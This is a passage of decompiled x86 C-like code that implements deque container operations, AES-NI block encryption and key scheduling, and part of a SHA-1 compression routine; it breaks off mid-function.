int __thiscall sub_466DC0(_DWORD *this, int a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  _DWORD *v4; // esi
  unsigned int v5; // ebp
  int result; // eax
  int v7; // ebx
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  int i; // edi
  bool v12; // zf
  int v13; // edx
  int v14; // ecx
  int v15; // eax
  unsigned int v16; // edi
  int v17; // ecx
  int v18; // eax
  int v19; // ebp
  int v20; // edi
  int v21; // edi
  _DWORD *v22; // esi
  unsigned int v23; // ebx
  int v24; // ebp
  int v25; // edx
  int v26; // ecx
  int j; // edi
  int v28; // edx
  int v29; // ecx
  int v30; // eax
  unsigned int v31; // edi
  int v32; // eax
  int v33; // ebp
  int v35; // [esp+18h] [ebp+4h]
  int v36; // [esp+18h] [ebp+4h]

  v2 = this;
  (*(void (__thiscall **)(_DWORD *, int))(this[4] + 32))(this + 4, a2);
  v3 = v2[18];
  v4 = v2 + 14;
  v5 = v2[17];
  result = v3 != 0;
  if ( v3 )
  {
    v7 = 1;
    do
    {
      v8 = (v4[2] - 1) & (v5 >> 1);
      v9 = v5++ & 1;
      v10 = *(_DWORD *)(v4[1] + 4 * v8);
      *(_DWORD *)(v10 + 8 * v9) = 0;
      *(_DWORD *)(v10 + 8 * v9 + 4) = 0;
      --v7;
    }
    while ( v7 );
    v2 = this;
    result = 0;
  }
  v35 = 1 - result;
  for ( i = v3 - result; i; --i )
  {
    v12 = v4[4]-- == 1;
    if ( v12 )
      v4[3] = 0;
  }
  if ( 1 != result )
  {
    v13 = v4[4];
    do
    {
      v14 = v4[3];
      if ( (((_BYTE)v14 + (_BYTE)v13) & 1) == 0 && v4[2] <= (unsigned int)(v13 + 2) >> 1 )
      {
        sub_467490(v4, (void *)1);
        v14 = v2[17];
      }
      v15 = v14 & (2 * v4[2] - 1);
      v4[3] = v15;
      v16 = v15 + v4[4];
      v17 = (v16 >> 1) & (v4[2] - 1);
      v18 = v4[1];
      v19 = 4 * v17;
      if ( !*(_DWORD *)(v18 + 4 * v17) )
      {
        *(_DWORD *)(v4[1] + 4 * v17) = operator new(0x10u);
        v18 = v2[15];
      }
      result = *(_DWORD *)(v18 + v19);
      v20 = v16 & 1;
      *(_DWORD *)(result + 8 * v20) = 0;
      *(_DWORD *)(result + 8 * v20 + 4) = 0;
      ++v4[4];
      v12 = v35-- == 1;
      v13 = v4[4];
    }
    while ( !v12 );
  }
  v21 = v2[23];
  v22 = v2 + 19;
  v23 = v2[22];
  v24 = v21 != 0;
  if ( v21 )
  {
    do
    {
      v25 = (v22[2] - 1) & (v23 >> 2);
      v26 = v23++ & 3;
      result = *(_DWORD *)(v22[1] + 4 * v25);
      *(_DWORD *)(result + 4 * v26) = 0;
      --v24;
    }
    while ( v24 );
  }
  v36 = 1 - v24;
  for ( j = v21 - v24; j; --j )
  {
    v12 = v22[4]-- == 1;
    if ( v12 )
      v22[3] = 0;
  }
  if ( 1 != v24 )
  {
    v28 = v22[4];
    do
    {
      v29 = v22[3];
      if ( (((_BYTE)v29 + (_BYTE)v28) & 3) == 0 && v22[2] <= (unsigned int)(v28 + 4) >> 2 )
      {
        sub_4672F0(v22, (void *)1);
        v29 = this[22];
      }
      v30 = v29 & (4 * v22[2] - 1);
      v22[3] = v30;
      v31 = v30 + v22[4];
      v32 = v22[1];
      v33 = 4 * ((v22[2] - 1) & (v31 >> 2));
      if ( !*(_DWORD *)(v32 + v33) )
      {
        *(_DWORD *)(v22[1] + v33) = operator new(0x10u);
        v32 = this[20];
      }
      result = *(_DWORD *)(v32 + v33);
      *(_DWORD *)(result + 4 * (v31 & 3)) = 0;
      ++v22[4];
      v12 = v36-- == 1;
      v28 = v22[4];
    }
    while ( !v12 );
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00466FE0) --------------------------------------------------------
char __thiscall sub_466FE0(_DWORD *this, int a2)
{
  int v2; // edx
  _DWORD *v3; // esi
  int v4; // ecx
  int v5; // eax
  unsigned int v6; // edi
  int v7; // eax
  int v8; // ebx
  char result; // al

  v2 = this[23];
  v3 = this + 19;
  v4 = this[22];
  if ( (((_BYTE)v4 + (_BYTE)v2) & 3) == 0 && v3[2] <= (unsigned int)(v2 + 4) >> 2 )
  {
    sub_4672F0(v3, (void *)1);
    v4 = v3[3];
  }
  v5 = v4 & (4 * v3[2] - 1);
  v3[3] = v5;
  v6 = v5 + v3[4];
  v7 = v3[1];
  v8 = 4 * ((v3[2] - 1) & (v6 >> 2));
  if ( !*(_DWORD *)(v7 + v8) )
  {
    *(_DWORD *)(v8 + v3[1]) = operator new(0x10u);
    v7 = v3[1];
  }
  *(_DWORD *)(*(_DWORD *)(v8 + v7) + 4 * (v6 & 3)) = 0;
  result = 0;
  ++v3[4];
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00467070) --------------------------------------------------------
__int64 __thiscall sub_467070(_DWORD *this)
{
  unsigned int v1; // esi
  _DWORD *v2; // ecx

  v1 = this[17];
  v2 = (_DWORD *)this[14];
  if ( v2 )
    v2 = (_DWORD *)*v2;
  return *(_QWORD *)(*(_DWORD *)(v2[1] + 4 * ((v2[2] - 1) & (v1 >> 1))) + 8 * (v1 & 1));
}

//----- (004670A0) --------------------------------------------------------
int __thiscall sub_4670A0(_DWORD *this)
{
  return this[23] - 1;
}

//----- (004670B0) --------------------------------------------------------
int __thiscall sub_4670B0(_DWORD *this)
{
  return this[18] - 1;
}

//----- (004670C0) --------------------------------------------------------
int __thiscall sub_4670C0(_DWORD *this)
{
  _DWORD *v1; // eax
  unsigned int v2; // esi
  _DWORD *v3; // ecx
  _DWORD **v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // ecx

  v1 = (_DWORD *)this[19];
  v2 = this[22];
  v3 = 0;
  if ( v1 )
  {
    v4 = (_DWORD **)*v1;
    if ( v4 )
      v3 = *v4;
  }
  v5 = 0;
  if ( v3 )
  {
    v6 = (_DWORD *)*v3;
    if ( v6 )
      v5 = (_DWORD *)*v6;
  }
  if ( v5 )
    v5 = (_DWORD *)*v5;
  return *(_DWORD *)(*(_DWORD *)(v5[1] + 4 * ((v5[2] - 1) & (v2 >> 2))) + 4 * (v2 & 3));
}

//----- (00467110) --------------------------------------------------------
int __thiscall sub_467110(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int ***v6; // ecx
  int *****v7; // eax
  int ****v8; // eax
  unsigned int v9; // edx
  int *v10; // eax
  int **v11; // ecx
  int v12; // edi
  int v13; // eax
  int v14; // edx
  int v15; // ecx
  int v16; // eax
  unsigned int v17; // edi
  int v18; // ecx
  int v19; // eax
  int v20; // ebp
  int v21; // eax
  int v22; // edi
  int ***v23; // ecx
  int *****v24; // eax
  int ****v25; // eax
  unsigned int v26; // edx
  int *v27; // eax
  int **v28; // ecx
  int v29; // esi
  int v30; // eax

  (*(void (__thiscall **)(_DWORD *, int, unsigned int, _DWORD, int))(this[4] + 24))(this + 4, a2, a3, 0, 1);
  v6 = 0;
  v7 = (int *****)this[14];
  if ( v7 )
  {
    v8 = *v7;
    if ( v8 )
      v6 = *v8;
  }
  v9 = this[17] + this[18] - 1;
  v10 = 0;
  if ( v6 )
  {
    v11 = *v6;
    if ( v11 )
      v10 = *v11;
  }
  if ( v10 )
    v12 = *v10;
  else
    v12 = 0;
  v13 = *(_DWORD *)(*(_DWORD *)(v12 + 4) + 4 * ((*(_DWORD *)(v12 + 8) - 1) & (v9 >> 1)));
  *(_QWORD *)(v13 + 8 * (v9 & 1)) += a3;
  if ( a4 )
  {
    v14 = this[18];
    v15 = this[17];
    if ( (((_BYTE)v15 + (_BYTE)v14) & 1) == 0 && this[16] <= (unsigned int)(v14 + 2) >> 1 )
    {
      sub_467490(this + 14, (void *)1);
      v15 = this[17];
    }
    v16 = v15 & (2 * this[16] - 1);
    this[17] = v16;
    v17 = v16 + this[18];
    v18 = (v17 >> 1) & (this[16] - 1);
    v19 = this[15];
    v20 = 4 * v18;
    if ( !*(_DWORD *)(v19 + 4 * v18) )
    {
      *(_DWORD *)(this[15] + 4 * v18) = operator new(0x10u);
      v19 = this[15];
    }
    v21 = *(_DWORD *)(v19 + v20);
    v22 = v17 & 1;
    v23 = 0;
    *(_DWORD *)(v21 + 8 * v22) = 0;
    *(_DWORD *)(v21 + 8 * v22 + 4) = 0;
    ++this[18];
    v24 = (int *****)this[19];
    if ( v24 )
    {
      v25 = *v24;
      if ( v25 )
        v23 = *v25;
    }
    v26 = this[22] + this[23] - 1;
    v27 = 0;
    if ( v23 )
    {
      v28 = *v23;
      if ( v28 )
        v27 = *v28;
    }
    if ( v27 )
      v29 = *v27;
    else
      v29 = 0;
    v30 = *(_DWORD *)(*(_DWORD *)(v29 + 4) + 4 * ((*(_DWORD *)(v29 + 8) - 1) & (v26 >> 2)));
    ++*(_DWORD *)(v30 + 4 * (v26 & 3));
  }
  return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00467250) --------------------------------------------------------
int __thiscall sub_467250(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[3] = a2;
  return result;
}

//----- (00467260) --------------------------------------------------------
int __thiscall sub_467260(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[4] + 64))(this + 4);
}

//----- (00467270) --------------------------------------------------------
int __thiscall sub_467270(_DWORD *this, int a2, int *a3, int a4, int a5)
{
  unsigned __int64 v6; // rax
  int v7; // ecx
  int v8; // edi
  int result; // eax
  _DWORD *v10; // edx
  _DWORD *v11; // ecx
  bool v12; // cf

  LODWORD(v6) = (*(int (__thiscall **)(_DWORD *))(*this + 64))(this);
  v7 = a3[1];
  v8 = *a3;
  if ( *(_QWORD *)a3 >= v6 )
  {
    v7 = HIDWORD(v6);
    v8 = v6;
  }
  a3[1] = v7;
  *a3 = v8;
  result = (*(int (__thiscall **)(_DWORD *, int, int *, int, int))(this[4] + 128))(this + 4, a2, a3, a4, a5);
  v10 = (_DWORD *)this[14];
  if ( v10 )
    v10 = (_DWORD *)*v10;
  v11 = (_DWORD *)(*(_DWORD *)(v10[1] + 4 * ((v10[2] - 1) & (this[17] >> 1))) + 8 * (this[17] & 1));
  v12 = *v11 < (unsigned int)*a3;
  *v11 -= *a3;
  v11[1] -= v12 + a3[1];
  return result;
}
// 46728E: variable 'v6' is possibly undefined

//----- (004672F0) --------------------------------------------------------
void __thiscall sub_4672F0(_DWORD *this, void *a2)
{
  unsigned int v2; // eax
  int v4; // edx
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // esi
  size_t v8; // eax
  void *v9; // eax
  char *v10; // edx
  const void *v11; // ecx
  char *v12; // edi
  size_t v13; // esi
  const void *v14; // ecx
  char *v15; // eax
  char *v16; // esi
  void *v17; // eax
  unsigned int v18; // [esp+Ch] [ebp-Ch]
  int v19; // [esp+14h] [ebp-4h]
  char *v20; // [esp+1Ch] [ebp+4h]

  v2 = 1;
  v4 = this[2];
  if ( v4 )
    v2 = this[2];
  while ( 1 )
  {
    v5 = v2 - v4;
    if ( v2 - v4 >= (unsigned int)a2 && v2 >= 8 )
      break;
    if ( 0xFFFFFFF - v2 < v2 )
      sub_4676D0(this);
    v2 *= 2;
  }
  v6 = 4 * v2;
  v7 = this[3] >> 2;
  v18 = v7;
  if ( v2 <= 0x3FFFFFFF )
  {
    if ( v6 < 0x1000 )
    {
      if ( v6 )
        v10 = (char *)operator new(4 * v2);
      else
        v10 = 0;
      goto LABEL_17;
    }
  }
  else
  {
    v6 = -1;
  }
  v8 = v6 + 35;
  if ( v6 + 35 <= v6 )
    v8 = -1;
  v9 = operator new(v8);
  if ( !v9 )
    goto LABEL_27;
  v10 = (char *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
  *((_DWORD *)v10 - 1) = v9;
LABEL_17:
  v19 = 4 * v7;
  v20 = v10;
  v11 = (const void *)(this[1] + 4 * v7);
  v12 = &v10[4 * v7];
  v13 = 4 * this[2] - 4 * v7;
  memmove_0(v12, v11, v13);
  v14 = (const void *)this[1];
  v15 = &v12[v13];
  if ( v18 > v5 )
  {
    memmove_0(v15, v14, 4 * v5);
    memmove_0(v20, (const void *)(4 * v5 + this[1]), v19 - 4 * v5);
    memset(&v20[v19 - 4 * v5], 0, 4 * v5);
    v16 = v20;
  }
  else
  {
    memmove_0(v15, v14, 4 * v18);
    memset(&v12[4 * v18 + v13], 0, 4 * (v5 - v18));
    v16 = v20;
    memset(v20, 0, 4 * v18);
  }
  v17 = (void *)this[1];
  if ( v17 )
  {
    if ( (unsigned int)(4 * this[2]) < 0x1000 )
    {
LABEL_24:
      sub_46C87D(v17);
      goto LABEL_25;
    }
    if ( (unsigned int)v17 - *((_DWORD *)v17 - 1) - 4 <= 0x1F )
    {
      v17 = (void *)*((_DWORD *)v17 - 1);
      goto LABEL_24;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_25:
  this[2] += v5;
  this[1] = v16;
}
// 4676D0: using guessed type void __thiscall __noreturn sub_4676D0(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00467490) --------------------------------------------------------
void __thiscall sub_467490(_DWORD *this, void *a2)
{
  unsigned int v2; // eax
  int v4; // edx
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  unsigned int v7; // esi
  size_t v8; // eax
  void *v9; // eax
  char *v10; // edx
  const void *v11; // ecx
  char *v12; // edi
  size_t v13; // esi
  const void *v14; // ecx
  char *v15; // eax
  char *v16; // esi
  void *v17; // eax
  unsigned int v18; // [esp+Ch] [ebp-Ch]
  int v19; // [esp+14h] [ebp-4h]
  char *v20; // [esp+1Ch] [ebp+4h]

  v2 = 1;
  v4 = this[2];
  if ( v4 )
    v2 = this[2];
  while ( 1 )
  {
    v5 = v2 - v4;
    if ( v2 - v4 >= (unsigned int)a2 && v2 >= 8 )
      break;
    if ( 0xFFFFFFF - v2 < v2 )
      sub_4676D0(this);
    v2 *= 2;
  }
  v6 = 4 * v2;
  v7 = this[3] >> 1;
  v18 = v7;
  if ( v2 <= 0x3FFFFFFF )
  {
    if ( v6 < 0x1000 )
    {
      if ( v6 )
        v10 = (char *)operator new(4 * v2);
      else
        v10 = 0;
      goto LABEL_17;
    }
  }
  else
  {
    v6 = -1;
  }
  v8 = v6 + 35;
  if ( v6 + 35 <= v6 )
    v8 = -1;
  v9 = operator new(v8);
  if ( !v9 )
    goto LABEL_27;
  v10 = (char *)(((unsigned int)v9 + 35) & 0xFFFFFFE0);
  *((_DWORD *)v10 - 1) = v9;
LABEL_17:
  v19 = 4 * v7;
  v20 = v10;
  v11 = (const void *)(this[1] + 4 * v7);
  v12 = &v10[4 * v7];
  v13 = 4 * this[2] - 4 * v7;
  memmove_0(v12, v11, v13);
  v14 = (const void *)this[1];
  v15 = &v12[v13];
  if ( v18 > v5 )
  {
    memmove_0(v15, v14, 4 * v5);
    memmove_0(v20, (const void *)(4 * v5 + this[1]), v19 - 4 * v5);
    memset(&v20[v19 - 4 * v5], 0, 4 * v5);
    v16 = v20;
  }
  else
  {
    memmove_0(v15, v14, 4 * v18);
    memset(&v12[4 * v18 + v13], 0, 4 * (v5 - v18));
    v16 = v20;
    memset(v20, 0, 4 * v18);
  }
  v17 = (void *)this[1];
  if ( v17 )
  {
    if ( (unsigned int)(4 * this[2]) < 0x1000 )
    {
LABEL_24:
      sub_46C87D(v17);
      goto LABEL_25;
    }
    if ( (unsigned int)v17 - *((_DWORD *)v17 - 1) - 4 <= 0x1F )
    {
      v17 = (void *)*((_DWORD *)v17 - 1);
      goto LABEL_24;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_25:
  this[2] += v5;
  this[1] = v16;
}
// 4676D0: using guessed type void __thiscall __noreturn sub_4676D0(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00467630) --------------------------------------------------------
void __thiscall sub_467630(_DWORD *this)
{
  int v2; // eax
  bool v3; // zf
  int v4; // edi
  void *v5; // eax
  _DWORD *v6; // eax

  v2 = this[4];
  while ( v2 )
  {
    v3 = v2-- == 1;
    this[4] = v2;
    if ( v3 )
      this[3] = 0;
  }
  v4 = this[2];
  while ( v4 )
  {
    --v4;
    v5 = *(void **)(this[1] + 4 * v4);
    if ( v5 )
      sub_46C87D(v5);
  }
  v6 = (_DWORD *)this[1];
  if ( v6 )
  {
    if ( (unsigned int)(4 * this[2]) >= 0x1000 )
    {
      if ( (unsigned int)v6 - *(v6 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v6 = (_DWORD *)*(v6 - 1);
    }
    sub_46C87D(v6);
  }
  this[2] = 0;
  this[1] = 0;
}

//----- (004676D0) --------------------------------------------------------
void __noreturn sub_4676D0()
{
  sub_46A183((int)"deque<T> too long");
}
// 4676D0: using guessed type void __noreturn sub_4676D0();

//----- (004676E0) --------------------------------------------------------
unsigned int __cdecl sub_4676E0(
        void (__cdecl *a1)(__m128i *, int, int),
        void (__cdecl *a2)(__m128i *, __m128i *, __m128i *, __m128i *, int, int),
        int a3,
        int a4,
        __m128i *a5,
        __m128i *a6,
        __m128i *a7,
        unsigned int a8,
        char a9)
{
  int v9; // eax
  __m128i *v10; // esi
  __m128i *v11; // ecx
  __m128i *v12; // edi
  int v13; // edx
  __m128i v14; // xmm5
  __m128i v15; // xmm2
  __m128i v16; // xmm3
  __m128i v17; // xmm4
  __m128i *v18; // ecx
  __m128i *v19; // ecx
  __m128i *v20; // ecx
  __m128i v21; // xmm0
  __m128i *v22; // esi
  __m128i v23; // xmm0
  __m128i *v24; // esi
  __m128i v25; // xmm0
  __m128i *v26; // esi
  __m128i v27; // xmm0
  __m128i v28; // xmm0
  __m128i *v29; // esi
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i *v32; // esi
  __m128i v33; // xmm1
  __m128i v34; // xmm2
  __m128i *v35; // esi
  __m128i v36; // xmm2
  __m128i v37; // xmm3
  __m128i v38; // xmm3
  __m128i *v39; // edi
  __m128i *v40; // edi
  __m128i *v41; // edi
  unsigned int v42; // ecx
  __m128i *v43; // eax
  int v44; // edx
  __m128i v45; // xmm1
  __m128i v46; // xmm0
  bool v47; // zf
  char v49; // [esp+12h] [ebp-5Ah]
  char v50; // [esp+13h] [ebp-59h]
  __m128i *v51; // [esp+14h] [ebp-58h]
  int v52; // [esp+18h] [ebp-54h]
  int v53; // [esp+1Ch] [ebp-50h]
  int v54; // [esp+20h] [ebp-4Ch]
  unsigned int v55; // [esp+24h] [ebp-48h]
  unsigned int v56; // [esp+24h] [ebp-48h]
  __m128i v57; // [esp+2Ch] [ebp-40h] BYREF
  __m128i v58; // [esp+3Ch] [ebp-30h] BYREF
  __m128i v59; // [esp+4Ch] [ebp-20h] BYREF
  __m128i v60; // [esp+5Ch] [ebp-10h] BYREF
  int v61; // [esp+94h] [ebp+28h]

  v9 = 16;
  v10 = a6;
  if ( (a9 & 3) != 0 )
    v9 = 0;
  v53 = v9;
  v54 = ~(8 * a9) & 0x10;
  v52 = a6 != 0 ? 0x10 : 0;
  if ( !a6 || (v49 = 1, (a9 & 4) == 0) )
    v49 = 0;
  if ( !a6 || (v50 = 1, (a9 & 4) != 0) )
    v50 = 0;
  v11 = a5;
  if ( (a9 & 8) != 0 )
  {
    v11 = (__m128i *)((char *)a5 + a8 - 16);
    v10 = (__m128i *)((char *)a6 + a8 - 16);
    v12 = (__m128i *)((char *)a7 + a8 - 16);
    v52 = -(a6 != 0 ? 0x10 : 0);
    v53 = -v9;
    v54 = -v54;
  }
  else
  {
    v12 = a7;
  }
  v51 = v11;
  if ( (a9 & 0x10) != 0 && a8 >= 0x40 )
  {
    v13 = v52;
    v55 = a8 >> 6;
    do
    {
      v14 = *v11;
      v57 = *v11;
      if ( (a9 & 1) != 0 )
      {
        v15 = _mm_add_epi32(v14, (__m128i)xmmword_4BCE50);
        v16 = _mm_add_epi32(v15, (__m128i)xmmword_4BCE50);
        v17 = _mm_add_epi32(v16, (__m128i)xmmword_4BCE50);
        *v11 = _mm_add_epi32(v17, (__m128i)xmmword_4BCE50);
      }
      else
      {
        v18 = (__m128i *)((char *)v11 + v53);
        v15 = *v18;
        v19 = (__m128i *)((char *)v18 + v53);
        v16 = *v19;
        v20 = (__m128i *)((char *)v19 + v53);
        v17 = *v20;
        v51 = (__m128i *)((char *)v20 + v53);
      }
      v60 = v17;
      v59 = v16;
      v58 = v15;
      if ( v49 )
      {
        v21 = *v10;
        v22 = (__m128i *)((char *)v10 + v13);
        v57 = _mm_xor_si128(v21, v14);
        v23 = *v22;
        v24 = (__m128i *)((char *)v22 + v13);
        v58 = _mm_xor_si128(v23, v15);
        v25 = *v24;
        v26 = (__m128i *)((char *)v24 + v13);
        v59 = _mm_xor_si128(v25, v16);
        v27 = *v26;
        v10 = (__m128i *)((char *)v26 + v13);
        v60 = _mm_xor_si128(v27, v17);
      }
      a2(&v57, &v58, &v59, &v60, a3, a4);
      v13 = v52;
      if ( v50 )
      {
        v28 = *v10;
        v29 = (__m128i *)((char *)v10 + v52);
        v30 = _mm_xor_si128(v28, v57);
        v31 = *v29;
        v32 = (__m128i *)((char *)v29 + v52);
        v33 = _mm_xor_si128(v31, v58);
        v34 = *v32;
        v35 = (__m128i *)((char *)v32 + v52);
        v36 = _mm_xor_si128(v34, v59);
        v37 = *v35;
        v10 = (__m128i *)((char *)v35 + v52);
        v38 = _mm_xor_si128(v37, v60);
      }
      else
      {
        v30 = v57;
        v33 = v58;
        v36 = v59;
        v38 = v60;
      }
      a8 -= 64;
      v11 = v51;
      *v12 = v30;
      v39 = (__m128i *)((char *)v12 + v54);
      *v39 = v33;
      v40 = (__m128i *)((char *)v39 + v54);
      *v40 = v36;
      v41 = (__m128i *)((char *)v40 + v54);
      *v41 = v38;
      v12 = (__m128i *)((char *)v41 + v54);
      --v55;
    }
    while ( v55 );
  }
  v42 = a8;
  if ( a8 >= 0x10 )
  {
    v43 = v51;
    v44 = a9 & 1;
    v61 = v44;
    v56 = a8 >> 4;
    do
    {
      v45 = *v43;
      v60 = *v43;
      if ( v49 )
        v60 = _mm_xor_si128(*v10, v45);
      if ( v44 )
        ++v43->m128i_i8[15];
      a1(&v60, a3, a4);
      if ( v50 )
        v46 = _mm_xor_si128(*v10, v60);
      else
        v46 = v60;
      v43 = (__m128i *)((char *)v51 + v53);
      v42 = a8 - 16;
      v10 = (__m128i *)((char *)v10 + v52);
      v44 = v61;
      *v12 = v46;
      v12 = (__m128i *)((char *)v12 + v54);
      v47 = v56-- == 1;
      v51 = (__m128i *)((char *)v51 + v53);
      a8 -= 16;
    }
    while ( !v47 );
  }
  return v42;
}
// 4BCE50: using guessed type __int128 xmmword_4BCE50;

//----- (00467A80) --------------------------------------------------------
__m128i *__cdecl sub_467A80(__m128i *a1, __m128i *a2, int a3)
{
  __m128i *result; // eax
  unsigned int v7; // edx

  result = a1;
  _EDI = a2;
  _XMM0 = _mm_xor_si128(*a1, *a2);
  *a1 = _XMM0;
  if ( (unsigned int)(a3 - 1) > 1 )
  {
    _ECX = a2 + 1;
    v7 = ((unsigned int)(a3 - 3) >> 1) + 1;
    do
    {
      _ECX += 2;
      __asm { aesenc  xmm0, xmmword ptr [ecx-20h] }
      *a1 = _XMM0;
      __asm { aesenc  xmm0, xmmword ptr [ecx-10h] }
      *a1 = _XMM0;
      --v7;
    }
    while ( v7 );
  }
  _ESI = 2 * a3;
  __asm { aesenc  xmm0, xmmword ptr [edi+esi*8-10h] }
  *a1 = _XMM0;
  __asm { aesenclast xmm0, xmmword ptr [edi+esi*8] }
  *a1 = _XMM0;
  return result;
}

//----- (00467AF0) --------------------------------------------------------
unsigned int __cdecl sub_467AF0(int a1, int a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6, char a7)
{
  return sub_4676E0(
           (void (__cdecl *)(__m128i *, int, int))sub_467A80,
           (void (__cdecl *)(__m128i *, __m128i *, __m128i *, __m128i *, int, int))sub_4679A0,
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7);
}
// 4679A0: using guessed type int sub_4679A0();

//----- (00467B20) --------------------------------------------------------
unsigned int __cdecl sub_467B20(_OWORD *a1, int a2)
{
  __int128 v4; // xmm1
  unsigned int result; // eax

  _EDX = a1;
  _ECX = 4 * a2 - 4;
  v4 = *a1;
  *a1 = a1[a2];
  a1[a2] = v4;
  for ( result = 4; result < _ECX; _ECX -= 4 )
  {
    __asm
    {
      aesimc  xmm0, xmmword ptr [edx+ecx*4]
      aesimc  xmm1, xmmword ptr [edx+eax*4]
    }
    a1[result / 4] = _XMM0;
    result += 4;
    *(_OWORD *)((char *)a1 + 4 * _ECX) = _XMM1;
  }
  __asm { aesimc  xmm0, xmmword ptr [edx+eax*4] }
  a1[result / 4] = _XMM0;
  return result;
}

//----- (00467B80) --------------------------------------------------------
char *__cdecl sub_467B80(char *Src, size_t Size, char *a3)
{
  int *v3; // esi
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  char *result; // eax
  int *v10; // edx
  int v11; // eax
  int v12; // ecx
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // ecx
  int *v23; // [esp+10h] [ebp-30h]
  _DWORD *v24; // [esp+14h] [ebp-2Ch]
  char *v25; // [esp+18h] [ebp-28h]
  size_t v26; // [esp+1Ch] [ebp-24h]
  size_t v27; // [esp+2Ch] [ebp-14h]
  __m128i v28; // [esp+30h] [ebp-10h]

  v3 = (int *)a3;
  v28 = *(__m128i *)&Src[Size - 16];
  memmove(a3, Src, Size);
  _XMM1 = v28;
  __asm { aeskeygenassist xmm0, xmm1, 0 }
  v24 = &unk_4BCE24;
  v6 = *(_DWORD *)a3 ^ _mm_extract_epi32(_XMM0, 3) ^ 1;
  v25 = &a3[16 * (Size >> 2) + 112];
  v26 = 4 * (Size >> 2);
  v23 = (int *)&a3[v26];
  *v23 = v6;
  v7 = v6 ^ *((_DWORD *)a3 + 1);
  v23[1] = v7;
  v8 = v7 ^ *((_DWORD *)a3 + 2);
  *(_DWORD *)&a3[v26 + 8] = v8;
  *(_DWORD *)&a3[v26 + 12] = v8 ^ *((_DWORD *)a3 + 3);
  v27 = v26 + 16;
  result = &a3[v26 + 16];
  if ( result != v25 )
  {
    v10 = (int *)&a3[v26];
    do
    {
      if ( Size == 24 )
      {
        v11 = v3[4] ^ v3[9];
        v12 = v11 ^ v3[5];
        v3[10] = v11;
        v3[11] = v12;
        _XMM1 = _mm_insert_epi32(_XMM1, v12, 3);
      }
      else if ( Size == 32 )
      {
        _XMM1 = _mm_insert_epi32(_XMM1, v3[11], 3);
        __asm { aeskeygenassist xmm0, xmm1, 0 }
        v15 = v3[4] ^ _mm_extract_epi32(_XMM0, 2);
        v16 = v15 ^ v3[5];
        v3[12] = v15;
        v17 = v16 ^ v3[6];
        v3[13] = v16;
        v18 = v17 ^ v3[7];
        v3[14] = v17;
        v3[15] = v18;
        _XMM1 = _mm_insert_epi32(_XMM1, v18, 3);
      }
      else
      {
        _XMM1 = _mm_insert_epi32(_XMM1, v3[7], 3);
      }
      v3 = v10;
      __asm { aeskeygenassist xmm0, xmm1, 0 }
      v10 = (int *)((char *)v10 + v26);
      v20 = *v3 ^ *v24++ ^ _mm_extract_epi32(_XMM0, 3);
      *v10 = v20;
      v21 = v20 ^ v3[1];
      v3[v26 / 4 + 1] = v21;
      v22 = v21 ^ v3[2];
      v3[v26 / 4 + 2] = v22;
      v3[v26 / 4 + 3] = v22 ^ v3[3];
      result = (char *)v3 + v27;
    }
    while ( (char *)v3 + v27 != v25 );
  }
  return result;
}

//----- (00467D10) --------------------------------------------------------
__m128i *__cdecl sub_467D10(__m128i *a1, __m128i *a2, unsigned int a3, int a4)
{
  __m128i *result; // eax
  __m128i v7; // xmm6
  __m128i *v8; // ecx
  unsigned int v9; // edx
  __int128 v124; // [esp+0h] [ebp-40h]
  __m128i v125; // [esp+10h] [ebp-30h]
  __m128i v126; // [esp+20h] [ebp-20h]
  __m128i v127; // [esp+30h] [ebp-10h]

  result = a1;
  _XMM4 = _mm_unpacklo_epi32(
            (__m128i)0i64,
            _mm_unpacklo_epi32(_mm_cvtsi32_si128(0), _mm_cvtsi32_si128(a1[1].m128i_u32[0])));
  _XMM5 = _mm_shuffle_epi32(*a1, 27);
  if ( a4 == 1 )
    v7 = (__m128i)xmmword_4BD0C0;
  else
    v7 = (__m128i)xmmword_4BD0D0;
  v125 = v7;
  if ( a3 >= 0x40 )
  {
    v8 = a2 + 2;
    v9 = a3 >> 6;
    do
    {
      _XMM2 = _mm_shuffle_epi8(v8[-2], v7);
      _XMM3 = _mm_shuffle_epi8(v8[-1], v7);
      _XMM7 = _mm_shuffle_epi8(*v8, v7);
      _XMM1 = _XMM5;
      v127 = _XMM5;
      __asm { sha1nexte xmm1, xmm3 }
      v126 = _XMM4;
      _XMM0 = _mm_add_epi32(_XMM2, _XMM4);
      __asm { sha1rnds4 xmm5, xmm0, 0 }
      _XMM0 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm1, 0
        sha1nexte xmm0, xmm7
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm0, 0
        sha1msg1 xmm2, xmm3
      }
      _XMM6 = _mm_shuffle_epi8(v8[1], v125);
      _XMM4 = _mm_xor_si128(_XMM7, _XMM2);
      _XMM0 = _XMM5;
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1msg2 xmm4, xmm6
        sha1rnds4 xmm5, xmm1, 0
        sha1msg1 xmm3, xmm7
        sha1nexte xmm0, xmm4
        sha1msg1 xmm7, xmm6
      }
      _XMM1 = _XMM5;
